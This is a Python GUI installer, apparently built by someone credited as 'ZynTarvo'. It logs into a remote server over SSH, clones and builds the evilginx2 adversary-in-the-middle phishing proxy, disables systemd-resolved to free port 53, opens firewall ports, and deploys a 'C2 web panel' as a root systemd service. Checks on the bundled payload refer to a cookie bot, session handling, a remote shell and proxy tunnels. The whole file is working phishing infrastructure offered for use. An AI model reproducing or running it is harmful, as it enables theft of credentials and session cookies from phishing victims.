#!/usr/bin/env python3
"""
Evilginx + C2 Panel installer (tkinter GUI).

Connects over SSH and installs:
  Go 1.20, DNS/port 53, clean evilginx2 clone, web panel, systemd.

Usage:  python evilginx_setup.py
"""

from __future__ import annotations

import os
import sys
import time
import shlex
import threading
import traceback
import webbrowser

# ── bootstrap paramiko ────────────────────────────────────────────────────────
def _ensure_paramiko():
    try:
        import paramiko  # noqa: F401
        return
    except ImportError:
        pass
    print("[*] Installing paramiko...")
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "paramiko"])

_ensure_paramiko()
import paramiko  # noqa: E402

import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext

HERE = os.path.dirname(os.path.abspath(sys.executable if getattr(sys, "frozen", False) else __file__))
if getattr(sys, "frozen", False) and hasattr(sys, "_MEIPASS"):
    HERE = sys._MEIPASS
PAYLOAD = os.path.join(HERE, "payload")
PANEL_PORT = 8443
PANEL_BUILD = "3.3.0"  # keep in sync with payload/app.py PANEL_VERSION
GO_VER = "1.20"
REMOTE_HOME_DEFAULT = "/root"
REMOTE_EGX = "/root/evilginx2"
REMOTE_PANEL = "/root/evilginx-panel"


# ═══════════════════════════════════════════════════════════════════════════════
#  SSH helper
# ═══════════════════════════════════════════════════════════════════════════════

class SSH:
    def __init__(self, host, port, user, password, log):
        self.host = host
        self.port = int(port)
        self.user = user
        self.password = password
        self.log = log
        self.client = None
        self.sftp = None
        self.is_root = user == "root"

    def connect(self):
        self.log(f"[*] SSH {self.user}@{self.host}:{self.port}")
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(
            self.host,
            port=self.port,
            username=self.user,
            password=self.password,
            timeout=25,
            allow_agent=False,
            look_for_keys=False,
            banner_timeout=30,
            auth_timeout=30,
        )
        c.get_transport().set_keepalive(15)
        self.client = c
        self.sftp = c.open_sftp()
        self.log("[+] SSH connected")

    def close(self):
        try:
            if self.sftp:
                self.sftp.close()
        except Exception:
            pass
        try:
            if self.client:
                self.client.close()
        except Exception:
            pass

    def _wrap(self, cmd: str) -> str:
        if self.is_root:
            return cmd
        pw = self.password.replace("'", "'\"'\"'")
        return f"echo '{pw}' | sudo -S -p '' bash -lc {shlex.quote(cmd)}"

    def run(self, cmd: str, timeout=180, check=False):
        wrapped = self._wrap(cmd)
        stdin, stdout, stderr = self.client.exec_command(wrapped, timeout=timeout, get_pty=True)
        out = stdout.read().decode("utf-8", "replace")
        err = stderr.read().decode("utf-8", "replace")
        code = stdout.channel.recv_exit_status()
        text = (out + "\n" + err).strip()
        if code != 0:
            self.log(f"    exit={code}  {cmd[:120]}")
            if text:
                for line in text.splitlines()[-12:]:
                    self.log(f"    {line}")
            if check:
                raise RuntimeError(f"Command failed ({code}): {cmd}\n{text[-1500:]}")
        return code, text

    def ok(self, cmd: str, timeout=180) -> bool:
        code, _ = self.run(cmd, timeout=timeout)
        return code == 0

    def try_cmds(self, title: str, cmds, timeout=180):
        """Try commands in order until one succeeds. cmds: list[str] or list[(label, cmd)]."""
        self.log(f"[*] {title}")
        last = ""
        for item in cmds:
            if isinstance(item, tuple):
                label, cmd = item
            else:
                label, cmd = item, item
            self.log(f"    try: {label}")
            code, out = self.run(cmd, timeout=timeout)
            if code == 0:
                self.log(f"[+] {title} — OK")
                return out
            last = out
        raise RuntimeError(f"{title} failed after all fallbacks.\n{last[-2000:]}")

    def put_file(self, local, remote):
        self.log(f"    upload {os.path.basename(local)} -> {remote}")
        self.sftp.put(local, remote)

    def mkdir_p(self, path):
        parts = path.strip("/").split("/")
        cur = ""
        for p in parts:
            cur += "/" + p
            try:
                self.sftp.stat(cur)
            except FileNotFoundError:
                try:
                    self.sftp.mkdir(cur)
                except IOError:
                    self.run(f"mkdir -p {shlex.quote(cur)}")


# ═══════════════════════════════════════════════════════════════════════════════
#  Installer
# ═══════════════════════════════════════════════════════════════════════════════

class Installer:
    def __init__(self, ssh: SSH, user: str, password: str, progress):
        self.ssh = ssh
        self.user = user
        self.password = password
        self.progress = progress
        self.log = ssh.log
        self.os_id = "ubuntu"
        self.os_ver = "20.04"
        self.arch = "amd64"
        self.python = "python3"
        self.venv = f"{REMOTE_PANEL}/venv"
        self.home = REMOTE_HOME_DEFAULT

    def set_pct(self, n):
        self.progress(n)

    def detect(self):
        self.set_pct(4)
        self.log("[*] Detecting OS / arch")
        _, out = self.ssh.run("cat /etc/os-release; echo ---; uname -m; echo ---; id -u")
        for line in out.splitlines():
            if line.startswith("ID="):
                self.os_id = line.split("=", 1)[1].strip().strip('"')
            if line.startswith("VERSION_ID="):
                self.os_ver = line.split("=", 1)[1].strip().strip('"')
        if "aarch64" in out or "arm64" in out:
            self.arch = "arm64"
        elif "armv7" in out:
            self.arch = "armv6l"
        else:
            self.arch = "amd64"
        if not self.ssh.is_root:
            _, home = self.ssh.run("echo $HOME")
            home = home.strip().splitlines()[-1].strip()
            if home.startswith("/"):
                self.home = home
        self.log(f"[+] OS={self.os_id} {self.os_ver}  arch={self.arch}")

    def apt_update(self):
        self.set_pct(8)
        env = "DEBIAN_FRONTEND=noninteractive"
        self.ssh.try_cmds("apt update", [
            ("apt-get update", f"{env} apt-get update -y"),
            ("apt update", f"{env} apt update -y"),
            ("apt-get update --fix-missing", f"{env} apt-get update --fix-missing -y"),
        ], timeout=180)

    def apt_install(self, packages, title=None):
        title = title or ("install " + " ".join(packages))
        pkgs = " ".join(packages)
        env = "DEBIAN_FRONTEND=noninteractive"
        self.ssh.try_cmds(title, [
            ("apt-get install", f"{env} apt-get install -y {pkgs}"),
            ("apt install", f"{env} apt install -y {pkgs}"),
            ("apt-get --fix-missing", f"{env} apt-get install -y --fix-missing {pkgs}"),
            ("apt-get --fix-broken", f"{env} apt-get -f install -y && {env} apt-get install -y {pkgs}"),
        ], timeout=300)

    def install_base_packages(self):
        self.set_pct(14)
        self.apt_install(
            ["git", "curl", "wget", "ca-certificates", "make", "gcc",
             "build-essential", "python3", "python3-pip"],
            "base packages (git/curl/make/python)",
        )
        # venv / extra python — Ubuntu 24 needs python3-venv / python3-full
        try:
            self.apt_install(
                ["python3-venv", "python3-full", "python3-dev"],
                "python3-venv (24.04+)",
            )
        except Exception as e:
            self.log(f"[!] python3-venv optional failed: {e}")
            try:
                self.apt_install(["python3-venv"], "python3-venv only")
            except Exception as e2:
                self.log(f"[!] python3-venv still failed, will adapt later: {e2}")

    def remove_old_go(self):
        self.set_pct(22)
        self.log("[*] Removing distro golang if present")
        self.ssh.run("apt-get remove -y golang-go golang 2>/dev/null; apt-get autoremove -y 2>/dev/null; true")
        self.ssh.run("rm -rf /usr/local/go")

    def install_go(self):
        self.set_pct(28)
        tarball = f"go{GO_VER}.linux-{self.arch}.tar.gz"
        urls = [
            f"https://go.dev/dl/{tarball}",
            f"https://dl.google.com/go/{tarball}",
        ]
        last = None
        for url in urls:
            self.log(f"    download {url}")
            cmds = [
                f"curl -fL --retry 3 -o /tmp/{tarball} {url}",
                f"wget -O /tmp/{tarball} {url}",
                f"curl -fL --insecure -o /tmp/{tarball} {url}",
            ]
            ok = False
            for c in cmds:
                if self.ssh.ok(c, timeout=180):
                    ok = True
                    break
            if not ok:
                last = url
                continue
            if self.ssh.ok(f"tar -C /usr/local -xzf /tmp/{tarball}"):
                self.ssh.run(f"rm -f /tmp/{tarball}")
                self.ssh.run(
                    "echo 'export PATH=/usr/local/go/bin:$PATH' > /etc/profile.d/golang.sh && "
                    "chmod +x /etc/profile.d/golang.sh"
                )
                code, ver = self.ssh.run("export PATH=/usr/local/go/bin:$PATH && go version")
                if code == 0 and "go1.20" in ver:
                    self.log(f"[+] {ver.strip()}")
                    return
                self.log(f"[!] unexpected go version: {ver}")
            last = url
        # last resort: distro package (not 1.20, but better than nothing)
        self.log("[!] official tarball failed, trying distro golang-go")
        try:
            self.apt_install(["golang-go"], "golang-go fallback")
            code, ver = self.ssh.run("go version")
            if code == 0:
                self.log(f"[+] fallback go: {ver.strip()}")
                return
        except Exception:
            pass
        raise RuntimeError(f"Go {GO_VER} install failed (last URL {last})")

    def install_python_deps(self):
        self.set_pct(40)
        self.log("[*] Python virtualenv + pip packages")
        req = (
            "flask flask-socketio simple-websocket pyyaml "
            "requests mysql-connector-python"
        )
        self.ssh.run(f"mkdir -p {REMOTE_PANEL}")
        venv = self.venv
        venv_cmds = [
            ("python3 -m venv", f"{self.python} -m venv {venv}"),
            ("python3 -m venv --without-pip", f"{self.python} -m venv --without-pip {venv}"),
            ("virtualenv", f"pip3 install virtualenv && virtualenv {venv}"),
        ]
        venv_ok = False
        for label, cmd in venv_cmds:
            self.log(f"    try venv: {label}")
            if self.ssh.ok(cmd, timeout=120):
                venv_ok = True
                break
        pip_bins = []
        if venv_ok:
            pip_bins = [
                f"{venv}/bin/pip",
                f"{venv}/bin/pip3",
                f"{venv}/bin/python -m pip",
            ]
            # Ubuntu 24 venv sometimes has no pip
            self.ssh.run(
                f"{venv}/bin/python -m ensurepip --upgrade 2>/dev/null || true"
            )
        pip_bins += [
            "python3 -m pip",
            "pip3",
            "pip",
        ]

        flags = [
            "",
            "--break-system-packages",
            "--break-system-packages --ignore-installed",
        ]
        last_err = ""
        for pip in pip_bins:
            for fl in flags:
                # --break-system-packages is invalid on old pip (20.04) — skip if venv
                if fl and venv_ok and pip.startswith(venv):
                    continue
                cmd = f"{pip} install --upgrade pip setuptools wheel {fl}".strip()
                self.ssh.run(cmd, timeout=180)
                inst = f"{pip} install {req} {fl}".strip()
                self.log(f"    pip: {inst}")
                code, out = self.ssh.run(inst, timeout=300)
                if code == 0:
                    self.log("[+] Python packages installed")
                    if not pip.startswith(venv):
                        self.venv = ""  # system python
                    return
                last_err = out
                if "No such option: --break-system-packages" in out:
                    continue
                if "externally-managed-environment" in out:
                    continue
        # apt fallback for flask/yaml/requests
        self.log("[!] pip failed, trying apt python packages + remaining pip")
        try:
            self.apt_install(
                ["python3-flask", "python3-yaml", "python3-requests", "python3-socks"],
                "apt python libs",
            )
        except Exception as e:
            self.log(f"[!] apt python libs: {e}")
        for pip, fl in [("python3 -m pip", "--break-system-packages"), ("pip3", "--break-system-packages")]:
            if self.ssh.ok(f"{pip} install flask-socketio simple-websocket mysql-connector-python {fl}", timeout=300):
                self.venv = ""
                self.log("[+] mixed apt+pip packages OK")
                return
        raise RuntimeError("Could not install Python dependencies.\n" + last_err[-1500:])

    def install_mysql_connector_system(self):
        """Install mysql.connector for /usr/bin/python3.

        Panel packages go into the venv; systemd custom services (cookie bot etc.)
        run system python3. PEP 668 on Ubuntu 24/26 blocks a plain pip install,
        so fall back to --break-system-packages.
        """
        self.log("[*] mysql-connector-python for system python3")
        check = 'python3 -c "import mysql.connector"'
        if self.ssh.ok(check):
            self.log("[+] mysql.connector already on system python3")
            return
        cmds = [
            "python3 -m pip install mysql-connector-python",
            "pip3 install mysql-connector-python --break-system-packages",
            "python3 -m pip install mysql-connector-python --break-system-packages",
            "pip3 install mysql-connector-python",
        ]
        for cmd in cmds:
            self.log(f"    try: {cmd}")
            self.ssh.run(cmd, timeout=300)
            if self.ssh.ok(check):
                self.log("[+] mysql-connector-python installed")
                return
        raise RuntimeError(
            "Could not install mysql-connector-python for /usr/bin/python3 "
            "(needed by systemd services such as evilginx_cookie_bot.py)"
        )

    def fix_dns(self):
        self.set_pct(50)
        self.log("[*] Freeing port 53 (systemd-resolved)")
        self.ssh.run("ss -lntp | grep -E ':53\\s' || netstat -lntp 2>/dev/null | grep ':53' || true")
        self.ssh.run("systemctl stop systemd-resolved 2>/dev/null || service systemd-resolved stop 2>/dev/null || true")
        self.ssh.run("systemctl disable systemd-resolved 2>/dev/null || true")
        self.ssh.run("systemctl mask systemd-resolved 2>/dev/null || true")
        # resolv.conf is often a symlink to stub-resolv
        cmds = [
            "rm -f /etc/resolv.conf && printf 'nameserver 8.8.8.8\\nnameserver 1.1.1.1\\n' > /etc/resolv.conf",
            "unlink /etc/resolv.conf 2>/dev/null; printf 'nameserver 8.8.8.8\\nnameserver 1.1.1.1\\n' > /etc/resolv.conf",
            "printf 'nameserver 8.8.8.8\\n' | tee /etc/resolv.conf",
        ]
        ok = False
        for c in cmds:
            if self.ssh.ok(c):
                ok = True
                break
        if not ok:
            self.log("[!] resolv.conf write failed, trying resolved.conf")
            self.ssh.run(
                "mkdir -p /etc/systemd/resolved.conf.d && "
                "printf '[Resolve]\\nDNS=8.8.8.8 1.1.1.1\\nDNSStubListener=no\\n' "
                "> /etc/systemd/resolved.conf.d/evilginx.conf && "
                "systemctl restart systemd-resolved 2>/dev/null || true"
            )
        _, resolv = self.ssh.run("cat /etc/resolv.conf")
        self.log("[+] resolv.conf:\n    " + " | ".join(resolv.splitlines()[:4]))

    def clone_evilginx(self):
        self.set_pct(58)
        self.log("[*] Cloning kgretzky/evilginx2 (clean)")
        self.ssh.run(f"rm -rf {REMOTE_EGX}")
        clones = [
            f"git clone --depth 1 https://github.com/kgretzky/evilginx2.git {REMOTE_EGX}",
            f"GIT_SSL_NO_VERIFY=1 git clone --depth 1 https://github.com/kgretzky/evilginx2.git {REMOTE_EGX}",
            f"git clone https://github.com/kgretzky/evilginx2.git {REMOTE_EGX}",
            f"git clone --depth 1 https://mirror.ghproxy.com/https://github.com/kgretzky/evilginx2.git {REMOTE_EGX}",
        ]
        last = ""
        for c in clones:
            self.log(f"    {c}")
            code, out = self.ssh.run(c, timeout=180)
            if code == 0:
                self.log("[+] Repository cloned")
                return
            last = out
        raise RuntimeError("git clone evilginx2 failed\n" + last[-1500:])

    def build_evilginx(self):
        self.set_pct(68)
        self.log("[*] Building evilginx (make)")
        go_path = "export PATH=/usr/local/go/bin:$PATH"
        builds = [
            f"{go_path} && cd {REMOTE_EGX} && make",
            f"{go_path} && cd {REMOTE_EGX} && GOPROXY=https://proxy.golang.org,direct make",
            f"{go_path} && cd {REMOTE_EGX} && GOPROXY=https://goproxy.io,direct make",
            f"{go_path} && cd {REMOTE_EGX} && GO111MODULE=on make",
            f"{go_path} && cd {REMOTE_EGX} && go build -o build/evilginx .",
        ]
        last = ""
        for c in builds:
            self.log(f"    {c[-80:]}")
            code, out = self.ssh.run(c, timeout=600)
            if code == 0 and self.ssh.ok(f"test -x {REMOTE_EGX}/build/evilginx"):
                self.log("[+] evilginx binary built")
                return
            last = out
            if "make: not found" in out or "No such file or directory" in out:
                self.apt_install(["make", "build-essential", "gcc"], "make/gcc retry")
        raise RuntimeError("evilginx make/build failed\n" + last[-2000:])

    def deploy_panel(self):
        self.set_pct(80)
        self.log(f"[*] Uploading C2 web panel v{PANEL_BUILD}")
        self.ssh.mkdir_p(f"{REMOTE_PANEL}/templates")
        mapping = [
            (os.path.join(PAYLOAD, "app.py"), f"{REMOTE_PANEL}/app.py"),
            (os.path.join(PAYLOAD, "proxy_engine.py"), f"{REMOTE_PANEL}/proxy_engine.py"),
            (os.path.join(PAYLOAD, "requirements.txt"), f"{REMOTE_PANEL}/requirements.txt"),
            (os.path.join(PAYLOAD, "templates", "index.html"), f"{REMOTE_PANEL}/templates/index.html"),
            (os.path.join(PAYLOAD, "templates", "login.html"), f"{REMOTE_PANEL}/templates/login.html"),
        ]
        static_dir = os.path.join(PAYLOAD, "static")
        if os.path.isdir(static_dir):
            self.ssh.mkdir_p(f"{REMOTE_PANEL}/static")
            for name in sorted(os.listdir(static_dir)):
                if name.startswith("evilginx2-"):
                    continue
                loc = os.path.join(static_dir, name)
                if os.path.isfile(loc):
                    mapping.append((loc, f"{REMOTE_PANEL}/static/{name}"))
        required_marks = {
            os.path.join(PAYLOAD, "app.py"): ["def api_sessions_clear", "def api_fs_list", "def api_service_create", "def favicon", "def _cookie_looks_like_jwt", "class ShellManager", "class JournalFollower", "def api_health", "def api_proxy_key", "import proxy_engine"],
            os.path.join(PAYLOAD, "proxy_engine.py"): [
                "def deploy_async", "class _Sidecar", "def record_auth_429", "def repair_instance",
                "def _install_squid", "def detach", "def drop_proxy_tunnels", "def _wait_guest_ready", "def _repair_install",
                "APT_IDLE", "settle 5s",
            ],
            os.path.join(PAYLOAD, "templates", "index.html"): [
                "File Explorer", "page-services", "CLEAR DATABASE", "openNewService",
                "/static/logo.png", "favicon-32.png", "logo-mark", "dash-charts", "menu-toggle",
                "E-Terminal", "page-shell", "initShell", "svcLiveLogs", "page-health", "startHealth",
                "page-proxy", "nc-panel", "loadProxy", "ncBadge",
                "pxRegionSearch", "pxDeployProgress", "--text3:#e2e8f0", "_pxIpLab",
            ],
            os.path.join(PAYLOAD, "templates", "login.html"): [
                "/static/logo.png", "favicon-32.png", "logo-mark", "ZynTarvo",
            ],
        }
        for need in ("logo.png", "favicon.ico", "favicon-32.png"):
            p = os.path.join(PAYLOAD, "static", need)
            if not os.path.isfile(p):
                raise RuntimeError(f"Missing panel icon in payload: static/{need}")
        for loc, rem in mapping:
            if not os.path.isfile(loc):
                raise RuntimeError(f"Missing payload file: {loc}")
            marks = required_marks.get(loc, [])
            if marks:
                txt = open(loc, encoding="utf-8", errors="replace").read()
                missing = [m for m in marks if m not in txt]
                if missing:
                    raise RuntimeError(f"Payload outdated ({os.path.basename(loc)} missing: {missing})")
            self.log(f"    {os.path.basename(loc)}  {os.path.getsize(loc)} bytes")
            self.ssh.put_file(loc, rem)
        self.ssh.run(f"chmod +x {REMOTE_PANEL}/app.py")

        # panel env (login = SSH login/password)
        pass_esc = self.password.replace("\\", "\\\\").replace('"', '\\"')
        env = (
            f"PANEL_HOST=0.0.0.0\n"
            f"PANEL_PORT={PANEL_PORT}\n"
            f"PANEL_USER={self.user}\n"
            f'PANEL_PASS="{pass_esc}"\n'
            f"EVILGINX_DIR={REMOTE_EGX}\n"
            f"PYTHONUNBUFFERED=1\n"
        )
        # write via sftp to avoid shell quoting issues
        tmp = "/tmp/evilginx-panel.env"
        with self.ssh.sftp.file(tmp, "w") as f:
            f.write(env)
        self.ssh.run(f"mv {tmp} {REMOTE_PANEL}/.env && chmod 600 {REMOTE_PANEL}/.env")

        py = f"{self.venv}/bin/python" if self.venv else "python3"
        # verify interpreter
        if self.venv and not self.ssh.ok(f"test -x {py}"):
            py = "python3"
        unit = f"""[Unit]
Description=EvilGinx C2 Web Panel
After=network.target

[Service]
User=root
WorkingDirectory={REMOTE_PANEL}
EnvironmentFile={REMOTE_PANEL}/.env
ExecStart={py} {REMOTE_PANEL}/app.py
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
"""
        with self.ssh.sftp.file("/tmp/evilginx-panel.service", "w") as f:
            f.write(unit)
        self.ssh.run("mv /tmp/evilginx-panel.service /etc/systemd/system/evilginx-panel.service")
        self.ssh.run("systemctl daemon-reload")
        self.log("[+] Panel files + systemd unit deployed")

    def firewall(self):
        self.set_pct(88)
        self.log("[*] Opening ports 53 / 80 / 443 / 8443")
        for spec in ["53/tcp", "53/udp", "80/tcp", "443/tcp", "8443/tcp"]:
            self.ssh.run(f"ufw allow {spec} 2>/dev/null || true")
        self.ssh.run(
            "iptables -C INPUT -p tcp --dport 8443 -j ACCEPT 2>/dev/null || "
            "iptables -I INPUT -p tcp --dport 8443 -j ACCEPT; "
            "iptables -C INPUT -p tcp --dport 443 -j ACCEPT 2>/dev/null || "
            "iptables -I INPUT -p tcp --dport 443 -j ACCEPT; "
            "iptables -C INPUT -p tcp --dport 80 -j ACCEPT 2>/dev/null || "
            "iptables -I INPUT -p tcp --dport 80 -j ACCEPT; "
            "iptables -C INPUT -p tcp --dport 53 -j ACCEPT 2>/dev/null || "
            "iptables -I INPUT -p tcp --dport 53 -j ACCEPT; "
            "iptables -C INPUT -p udp --dport 53 -j ACCEPT 2>/dev/null || "
            "iptables -I INPUT -p udp --dport 53 -j ACCEPT; true"
        )

    def start_all(self):
        self.set_pct(94)
        self.log("[*] Starting panel + evilginx")
        self.ssh.run("systemctl enable evilginx-panel")
        self.ssh.run("systemctl restart evilginx-panel")
        time.sleep(4)
        code, st = self.ssh.run("systemctl is-active evilginx-panel")
        if "active" not in st:
            _, journal = self.ssh.run("journalctl -u evilginx-panel -n 40 --no-pager")
            raise RuntimeError("Panel service failed to start:\n" + journal[-2500:])
        self.log("[+] evilginx-panel is active")
        # panel starts evilginx itself; wait and check process
        time.sleep(3)
        _, ps = self.ssh.run(f"pgrep -af {REMOTE_EGX}/build/evilginx || true")
        if "evilginx" in ps:
            self.log("[+] evilginx process is running")
        else:
            self.log("[!] evilginx process not seen yet — panel will retry on start")

    def run(self):
        self.detect()
        self.apt_update()
        self.install_base_packages()
        self.remove_old_go()
        self.install_go()
        self.install_python_deps()
        self.install_mysql_connector_system()
        self.fix_dns()
        self.clone_evilginx()
        self.build_evilginx()
        self.deploy_panel()
        self.firewall()
        self.start_all()
        self.set_pct(100)
        url = f"http://{self.ssh.host}:{PANEL_PORT}"
        self.log("")
        self.log("=" * 54)
        self.log("  INSTALL COMPLETE")
        self.log(f"  Panel:    {url}")
        self.log(f"  Login:    {self.user}")
        self.log("  Password: (the SSH password you entered)")
        self.log("=" * 54)


# ═══════════════════════════════════════════════════════════════════════════════
#  GUI
# ═══════════════════════════════════════════════════════════════════════════════

BG = "#0a0e17"
BG2 = "#111827"
BG3 = "#1a2332"
ACCENT = "#00ff88"
CYAN = "#22d3ee"
ORANGE = "#f59e0b"
TEXT = "#ffffff"
MUTED = "#94a3b8"
RED = "#ef4444"
FONT = ("Segoe UI", 11)
MONO = ("Consolas", 10)
TITLE = ("Segoe UI", 18, "bold")


class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title(f"EVILGINX  //  INSTALLER v{PANEL_BUILD}")
        self.configure(bg=BG)
        self.geometry("760x720")
        self.minsize(680, 600)
        self.installing = False
        self._set_icons()
        self._build()

    def _set_icons(self):
        ico = os.path.join(HERE, "icon.ico")
        png = os.path.join(HERE, "icon.png")
        try:
            if os.path.isfile(ico):
                self.iconbitmap(ico)
        except Exception:
            pass
        try:
            if os.path.isfile(png):
                self._wm_icon = tk.PhotoImage(file=png)
                self.iconphoto(True, self._wm_icon)
        except Exception:
            pass

    def _build(self):
        pad = {"padx": 18, "pady": 6}

        head = tk.Frame(self, bg=BG)
        head.pack(pady=(18, 0))
        mark = os.path.join(HERE, "icon.png")
        if os.path.isfile(mark):
            try:
                self._logo_img = tk.PhotoImage(file=mark)
                tk.Label(head, image=self._logo_img, bg=BG).pack()
            except Exception:
                pass
        tk.Label(head, text="EVILGINX", fg=ACCENT, bg=BG, font=TITLE).pack(pady=(8, 0))
        tk.Label(
            head, text=f"C2 PANEL INSTALLER v{PANEL_BUILD}  ·  Ubuntu 20.04 / 22.04 / 24.04 / 26.04",
            fg=CYAN, bg=BG, font=("Segoe UI", 9),
        ).pack(pady=(0, 4))
        tk.Label(
            head, text="lynx icon · explorer · services · sessions · telegram · charts",
            fg=MUTED, bg=BG, font=("Segoe UI", 8),
        ).pack(pady=(0, 2))
        credit = tk.Frame(head, bg=BG)
        credit.pack(pady=(0, 8))
        tk.Label(credit, text="Created by ", fg=ORANGE, bg=BG, font=("Segoe UI", 8)).pack(side="left")
        tk.Label(credit, text="ZynTarvo", fg=ACCENT, bg=BG, font=("Segoe UI", 8, "bold")).pack(side="left")

        form = tk.Frame(self, bg=BG)
        form.pack(fill="x", **pad)

        self.var_ip = tk.StringVar()
        self.var_port = tk.StringVar(value="22")
        self.var_user = tk.StringVar(value="root")
        self.var_pass = tk.StringVar()

        def row(r, label, var, show=None):
            tk.Label(form, text=label, fg=ACCENT, bg=BG, font=("Segoe UI", 9, "bold")).grid(
                row=r, column=0, sticky="w", pady=6, padx=(0, 12)
            )
            e = tk.Entry(
                form, textvariable=var, font=FONT, bg=BG3, fg=TEXT,
                insertbackground=ACCENT, relief="flat", highlightthickness=1,
                highlightbackground="#1e3a2f", highlightcolor=ACCENT, show=show or "",
            )
            e.grid(row=r, column=1, sticky="ew", ipady=7)
            return e

        form.columnconfigure(1, weight=1)
        row(0, "SERVER IP", self.var_ip)
        row(1, "SSH PORT", self.var_port)
        row(2, "LOGIN", self.var_user)
        row(3, "PASSWORD", self.var_pass, show="•")

        self.btn = tk.Button(
            self, text="INSTALL", command=self.start, font=("Segoe UI", 12, "bold"),
            bg=ACCENT, fg=BG, activebackground="#4ade80", activeforeground=BG,
            relief="flat", cursor="hand2", pady=10,
        )
        self.btn.pack(fill="x", padx=18, pady=(10, 8))

        style = ttk.Style()
        try:
            style.theme_use("clam")
        except Exception:
            pass
        style.configure("EG.Horizontal.TProgressbar", troughcolor=BG3, background=ACCENT, bordercolor=BG)
        self.pb = ttk.Progressbar(self, style="EG.Horizontal.TProgressbar", mode="determinate", maximum=100)
        self.pb.pack(fill="x", padx=18, pady=(0, 8))

        self.logbox = scrolledtext.ScrolledText(
            self, height=16, bg=BG2, fg=ACCENT, insertbackground=ACCENT,
            font=MONO, relief="flat", wrap="word",
        )
        self.logbox.pack(fill="both", expand=True, padx=18, pady=(0, 18))
        self.logbox.tag_configure("okmark", foreground=ACCENT, font=("Segoe UI", 18, "bold"))
        self.logbox.configure(state="disabled")
        self._log(f"[*] Installer v{PANEL_BUILD} — current panel build packed in payload/")
        self._log("[*] Fill IP / port / login / password and press INSTALL")
        self._log("[*] Panel will listen on port 8443. Login = same SSH credentials.")

    def _log(self, msg):
        def _append():
            self.logbox.configure(state="normal")
            self.logbox.insert("end", msg + "\n")
            self.logbox.see("end")
            self.logbox.configure(state="disabled")
        self.after(0, _append)

    def _log_done(self):
        def _append():
            self.logbox.configure(state="normal")
            self.logbox.insert("end", "Installation process fully complete  ")
            self.logbox.insert("end", "✔\n", "okmark")
            self.logbox.see("end")
            self.logbox.configure(state="disabled")
        self.after(0, _append)

    def _progress(self, n):
        self.after(0, lambda: self.pb.configure(value=n))

    def _on_success(self, url):
        try:
            webbrowser.open(url, new=2)
        except Exception as e:
            self._log(f"[!] Could not open browser: {e}")

    def start(self):
        if self.installing:
            return
        ip = self.var_ip.get().strip()
        port = self.var_port.get().strip() or "22"
        user = self.var_user.get().strip()
        pw = self.var_pass.get()
        if not ip or not user or not pw:
            messagebox.showerror("Missing fields", "IP, login and password are required.")
            return
        if not os.path.isdir(PAYLOAD):
            messagebox.showerror("Payload missing", f"Folder not found:\n{PAYLOAD}")
            return
        self.installing = True
        self.btn.configure(state="disabled", text="INSTALLING...")
        self.pb.configure(value=1)
        t = threading.Thread(target=self._worker, args=(ip, port, user, pw), daemon=True)
        t.start()

    def _worker(self, ip, port, user, pw):
        ssh = None
        try:
            ssh = SSH(ip, port, user, pw, self._log)
            ssh.connect()
            inst = Installer(ssh, user, pw, self._progress)
            inst.run()
            url = f"http://{ip}:{PANEL_PORT}"
            self._log(f"[*] Opening browser: {url}")
            self._log_done()
            self.after(0, lambda u=url: self._on_success(u))
        except Exception as e:
            self._log("")
            self._log("[ERROR] " + str(e))
            self._log(traceback.format_exc().splitlines()[-1])
            self.after(0, lambda: messagebox.showerror("Install failed", str(e)[:800]))
        finally:
            if ssh:
                ssh.close()
            self.installing = False
            self.after(0, lambda: self.btn.configure(state="normal", text="INSTALL"))


def main():
    app = App()
    app.mainloop()


if __name__ == "__main__":
    main()
